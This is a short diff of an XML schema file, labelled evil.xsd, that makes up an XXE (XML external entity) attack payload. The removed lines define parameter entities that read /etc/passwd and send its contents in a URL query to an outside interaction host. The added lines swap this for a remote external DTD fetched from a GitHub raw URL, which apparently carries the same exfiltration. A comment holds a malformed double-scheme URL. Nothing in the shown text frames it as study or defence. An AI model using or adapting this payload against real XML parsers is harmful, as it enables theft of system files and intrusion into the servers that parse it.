@@ -1,8 +1,8 @@
+<!-- evil.xsd на http://https://raw.githubusercontent.com/KrakenMSK/testtest/refs/heads/main/test.dtd/evil.xsd -->
 <!DOCTYPE xs:schema [
-    <!ENTITY % payload SYSTEM "file:///etc/passwd">
-    <!ENTITY % wrapper "<!ENTITY &#x25; exfil SYSTEM 'http://azdl524mtsvhn4bpq7ghkcbcw32uqzeo.c.p0w.pw/?data=%payload;'>">
-    %wrapper;
-    %exfil;
+    <!ENTITY % remote SYSTEM "https://raw.githubusercontent.com/KrakenMSK/testtest/refs/heads/main/test.dtd">
+    %remote;
 ]>
 <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
+    <xs:element name="root" type="xs:string"/>
 </xs:schema>
